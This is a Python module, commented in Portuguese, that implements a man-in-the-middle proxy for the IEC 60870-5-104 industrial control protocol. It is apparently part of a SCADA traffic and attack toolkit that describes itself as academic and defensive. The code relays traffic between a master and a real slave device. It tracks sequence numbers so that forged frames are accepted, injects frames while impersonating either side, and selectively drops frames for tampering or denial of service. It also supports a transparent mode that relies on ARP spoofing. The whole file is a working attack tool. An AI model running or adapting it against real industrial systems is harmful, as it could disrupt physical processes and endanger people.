"""
Proxy MITM (on-path) para IEC 60870-5-104.

O atacante fica FORA da conversa, entre o master e o slave reais:

    master  ──►  [ proxy :2404 ]  ──►  slave real :2405
            ◄──                   ◄──

O proxy escuta onde o master espera o slave (2404), conecta ao slave real
(2405) e repassa os dois sentidos. De um console, o atacante pode:
  - OBSERVAR toda a conversa (frames decodificados, nos dois sentidos);
  - INJETAR frames maliciosos  → slave  (como se fosse o master);
  - INJETAR frames maliciosos  → master (como se fosse o slave);
  - DESCARTAR frames em transito (tamper / DoS seletivo).

Uso academico/defensivo. O mesmo padrao se repete para DNP3 e OPC-UA.
"""

import asyncio
import logging
from typing import Optional

from ..protocols.iec104.frames import APDUCodec, frame_label
from .iec104_lib import IEC104AttackSession, _fmt_hex

logger = logging.getLogger("scada_trafgen.mitm")

# Cores ANSI
DIM = "\033[90m"; RESET = "\033[0m"; BOLD = "\033[1m"
RED = "\033[31m"; GRN = "\033[32m"; YEL = "\033[33m"; CYA = "\033[36m"; MAG = "\033[35m"


class IEC104Mitm:
    """Proxy transparente com injecao e descarte por sentido."""

    def __init__(self, listen_host="127.0.0.1", listen_port=2404,
                 slave_host="127.0.0.1", slave_port=2405, transparent=False):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.slave_host = slave_host
        self.slave_port = slave_port
        # Modo transparente: o upstream (slave real) e descoberto por SO_ORIGINAL_DST
        # a cada conexao (ARP spoofing + iptables REDIRECT), em vez do par fixo.
        self.transparent = transparent

        self.master_writer: Optional[asyncio.StreamWriter] = None
        self.slave_writer: Optional[asyncio.StreamWriter] = None
        self._connected = False

        self.observe = False
        self.drop = {"to-slave": 0, "to-master": 0}

        # Construtores de frame (nao abrem socket): um para impersonar o master
        # (frames -> slave) e outro para impersonar o slave (frames -> master).
        # Os SSN/RSN sao sincronizados com o que se observa passando na linha.
        self.as_master = IEC104AttackSession()   # injeta -> slave
        self.as_slave = IEC104AttackSession()     # injeta -> master
        self.server: Optional[asyncio.AbstractServer] = None
        self._stop = asyncio.Event()

    # ------------------------------------------------------------------
    # Proxy
    # ------------------------------------------------------------------
    async def _handle_master(self, m_reader, m_writer):
        peer = m_writer.get_extra_info("peername")
        shost, sport = self.slave_host, self.slave_port
        if self.transparent:
            from .transparent import original_dst
            dst = original_dst(m_writer)
            if dst:
                shost, sport = dst      # IP:porta do RTU real (SO_ORIGINAL_DST)
            else:
                print(f"{RED}[!] transparente: SO_ORIGINAL_DST indisponivel; "
                      f"usando {shost}:{sport}{RESET}")
        print(f"\n{GRN}[+] master conectou de {peer}; abrindo upstream para "
              f"o slave {shost}:{sport}{RESET}")
        try:
            s_reader, s_writer = await asyncio.open_connection(shost, sport)
        except OSError as e:
            print(f"{RED}[!] falha ao conectar no slave real: {e}{RESET}")
            m_writer.close()
            return

        self.master_writer = m_writer
        self.slave_writer = s_writer
        self._connected = True
        print(f"{GRN}[+] MITM ativo: master <-> proxy <-> slave{RESET}\n")

        pump_ms = asyncio.create_task(self._pump(m_reader, s_writer, "to-slave"))
        pump_sm = asyncio.create_task(self._pump(s_reader, m_writer, "to-master"))
        try:
            await asyncio.wait([pump_ms, pump_sm],
                               return_when=asyncio.FIRST_COMPLETED)
        finally:
            for t in (pump_ms, pump_sm):
                t.cancel()
            await asyncio.gather(pump_ms, pump_sm, return_exceptions=True)
            self._connected = False
            for w in (m_writer, s_writer):
                try:
                    w.close()
                except OSError:
                    pass
            print(f"\n{YEL}[-] conexao encerrada; MITM em espera{RESET}")

    async def _pump(self, reader, writer, direction: str):
        """Repassa frame a frame de um lado ao outro, observando e permitindo drop."""
        buf = b""
        while not self._stop.is_set():
            try:
                data = await reader.read(4096)
            except (ConnectionError, OSError):
                break
            if not data:
                break
            buf += data
            while True:
                frame, buf = APDUCodec.read_frame_from_buffer(buf)
                if frame is None:
                    break
                self._track(frame, direction)
                if self.observe:
                    self._print_frame(frame, direction, injected=False)
                if self.drop[direction] > 0:
                    self.drop[direction] -= 1
                    print(f"{RED}[drop {direction}] frame descartado "
                          f"({_fmt_hex(frame)[:23]}...){RESET}")
                    continue
                try:
                    writer.write(frame)
                    await writer.drain()
                except (ConnectionError, OSError):
                    return

    def _track(self, frame: bytes, direction: str):
        """Sincroniza os SSN/RSN dos construtores com o que passa na linha."""
        d = APDUCodec.decode_frame(frame)
        if d.get("type") != "I":
            return
        ssn = d.get("ssn", 0)
        rsn = d.get("rsn", 0)
        if direction == "to-slave":         # frame veio do master
            self.as_master.ssn = (ssn + 1) % 32768
            self.as_master.rsn = rsn
        else:                                # frame veio do slave
            self.as_slave.ssn = (ssn + 1) % 32768
            self.as_slave.rsn = rsn

    # ------------------------------------------------------------------
    # Injecao
    # ------------------------------------------------------------------
    async def inject(self, frame: bytes, target: str):
        """Escreve um frame diretamente no destino (master ou slave)."""
        writer = self.slave_writer if target == "to-slave" else self.master_writer
        if writer is None or writer.is_closing():
            print(f"{RED}[!] sem conexao ativa para injetar ({target}){RESET}")
            return
        try:
            writer.write(frame)
            await writer.drain()
        except (ConnectionError, OSError) as e:
            print(f"{RED}[!] falha ao injetar: {e}{RESET}")
            return
        self._print_frame(frame, target, injected=True)

    # ------------------------------------------------------------------
    # Impressao
    # ------------------------------------------------------------------
    def _print_frame(self, frame: bytes, direction: str, injected: bool):
        d = APDUCodec.decode_frame(frame)
        lbl = frame_label(d)
        arrow = "──► slave" if direction == "to-slave" else "──► master"
        extra = ""
        if lbl.get("cot"):
            extra = f" COT={lbl['cot']}"
            if lbl.get("n"):
                extra += f" x{lbl['n']}"
        if injected:
            tag = f"{MAG}{BOLD}[INJETADO {arrow}]{RESET}"
        else:
            col = CYA if direction == "to-master" else DIM
            tag = f"{col}[{arrow}]{RESET}"
        print(f"  {tag} {lbl['name']}{extra}  {DIM}{_fmt_hex(frame)[:35]}{RESET}")

    def status(self):
        st = f"{GRN}ativo{RESET}" if self._connected else f"{YEL}em espera{RESET}"
        print(f"  MITM {st} | proxy :{self.listen_port} -> slave "
              f"{self.slave_host}:{self.slave_port}")
        print(f"  observe={'on' if self.observe else 'off'} | "
              f"drop to-slave={self.drop['to-slave']} to-master={self.drop['to-master']}")
        print(f"  seq observado: master ssn~{self.as_master.ssn} rsn~{self.as_master.rsn} "
              f"| slave ssn~{self.as_slave.ssn} rsn~{self.as_slave.rsn}")

    # ------------------------------------------------------------------
    # Ciclo de vida
    # ------------------------------------------------------------------
    async def serve(self):
        self.server = await asyncio.start_server(
            self._handle_master, self.listen_host, self.listen_port)
        print(f"{GRN}Proxy MITM ouvindo em {self.listen_host}:{self.listen_port}"
              f"{RESET}  (repassando para o slave {self.slave_host}:{self.slave_port})")
        async with self.server:
            await self.server.serve_forever()

    async def shutdown(self):
        self._stop.set()
        if self.server:
            self.server.close()
